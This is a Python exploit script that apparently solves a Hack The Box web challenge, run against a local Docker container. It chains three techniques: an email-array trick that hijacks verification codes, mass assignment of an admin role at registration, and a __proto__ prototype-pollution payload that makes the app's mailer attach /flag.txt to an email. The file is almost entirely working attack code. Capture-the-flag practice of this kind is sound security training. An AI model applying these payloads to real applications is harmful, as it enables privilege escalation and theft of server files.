import httpx
from bs4 import BeautifulSoup
import os
from time import sleep
import sys
import re
from base64 import b64decode

class API:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.c = httpx.Client()
        self.verifCode = None

    def sendVerifCode(self, email):
        data = {"email":[email,"test@email.htb"]}
        return self.c.post(f"{self.base_url}/api/sendEmail", json=data).json()

    def submitVerifCode(self):
        data = {"email":"kutikula@interstellar.htb","code":self.verifCode}
        self.c.post(f"{self.base_url}/api/verify", json=data).json()
        print("[+] Email Verified")

    def register(self,email):
        resp = self.c.post(f"{self.base_url}/api/register", json={"email": email, "password": "aa", "role": "admin"}).json()
        print(resp)

    def login(self,):
        resp = self.c.post(f"{self.base_url}/api/login", json={"email": "kutikula@interstellar.htb", "password": "aa"})
        token = resp.json().get('token')
        self.c.headers["Cookie"] = f"auth={token}"
        return f"[+] get admin token: {token}", token
    
    def getBounty(self, id):
        return self.c.get(f"{self.base_url}/api/bounties/{id}").json()
    
    def makeBounty(self, payload):
        return self.c.post(f"{self.base_url}/api/bounties", json=payload).json()
    
    def updateBounty(self, id, payload):
        return self.c.put(f"{self.base_url}/api/bounties/{id}", json={"status": "approved", **payload}).json()


class Mail:
    def deleteAllVerif(self):
        r = httpx.get("http://localhost:9080/deleteall")

    def getVerifCode(self):
        response = httpx.get("http://localhost:9080/")

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            td = soup.find('td', text=lambda t: t and 'Your verification code is:' in t)
            
            if td:

                verification_code = td.text.split('Your verification code is:')[1].strip()
                return verification_code
            else:
                print("Verification code not found.")
                return None
        else:
            print(f"Failed to fetch the page. Status code: {response.status_code}")
            return None

bounty = {"target_name":"aaaa","target_aliases":"aaaa","target_species":"aaaa","last_known_location":"aaaa","galaxy":"aaaa","star_system":"aaaa","planet":"aaaa","coordinates":"aaaa","reward_credits":111,"reward_items":"aaaa","issuer_name":"aaaa","issuer_faction":"aaaa","risk_level":"low","image":"","description":"1111"}

payload = {
    'description':'saaa',
    'target_name':'saaa',
    "__proto__": {
        "fields": [],
        "attributes": ["id", "email", "isVerified", "role"],
        "attachments": [ 
            { 
                "filename": "flag.txt",
                "path": "/flag.txt",
            }
            ],
        }
    }


if __name__ == "__main__":
    # Reset the container because the app tends to broken if we fail to use intended pollute
    os.system("docker rm -f web_intergalatic_bounty")
    os.system("docker run --name=web_intergalatic_bounty -d --rm -p1337:1337 -p9080:8080 -it web_intergalatic_bounty")
    sleep(10)
    api = API("http://localhost:1337")
    mail = Mail()

    #login as admin, and 1 other user
    api.register("kutikula@interstellar.htb")
    api.register("mariaban@interstellar.htb")


    #check verify token
    mail.deleteAllVerif()
    resp = api.sendVerifCode("kutikula@interstellar.htb")
    if resp.get("status") != 400:
        api.verifCode = mail.getVerifCode()
        if api.verifCode:
            api.submitVerifCode()
        else:
            exit()


    stat, token = api.login()
    print(token)
    
    stat = api.makeBounty(bounty)

    #Trigger Pollution
    stat = api.updateBounty(7, payload)

    #Retrieve the flag
    # mail.deleteAllVerif()
    stat = api.sendVerifCode("mariaban@interstellar.htb")

    #Read The Flag
    huzzah = mail.getVerifCode()
    regex = r'\b[A-Za-z0-9+/]{4,}={0,2}\b'
    matches = re.findall(regex, huzzah)
    for match in matches:
        try:
            valid = b64decode(match, validate=True).decode()
            if "HTB" in valid: print(f"[+] Flag: {valid}")
        except Exception:
            pass
